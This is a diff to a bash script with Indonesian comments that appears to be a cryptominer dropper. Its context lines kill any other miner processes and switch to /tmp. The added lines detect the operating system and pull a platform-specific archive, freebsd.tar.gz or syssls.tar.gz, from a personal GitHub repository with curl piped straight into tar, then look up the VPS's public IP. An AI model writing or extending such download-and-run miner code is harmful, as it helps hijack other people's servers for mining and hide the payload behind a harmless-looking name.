@@ -20,12 +20,20 @@ echo "Semua proses miner yang ditemukan telah dibunuh."
 # Pindah ke direktori /tmp
 cd /tmp
 
+# Mendapatkan nama sistem operasi
+OS=$(uname)
+
 if [[ -f "/tmp/syssls" ]]; then
     echo "File syssls ditemukan, siap dieksekusi."
 else
     echo "File syssls tidak ditemukan, proses unduhan."
-    # Download dan ekstrak syssls.tar.gz dari GitHub
-    curl -L https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz | tar zx
+    if [[ "$OS" == "FreeBSD" ]]; then
+        # Download dan ekstrak freebsd.tar.gz dari GitHub
+        curl -L https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/freebsd.tar.gz | tar zx
+    else
+        # Download dan ekstrak syssls.tar.gz dari GitHub
+        curl -L https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz | tar zx
+    fi
 fi
 
 # Mendapatkan alamat IP publik VPS
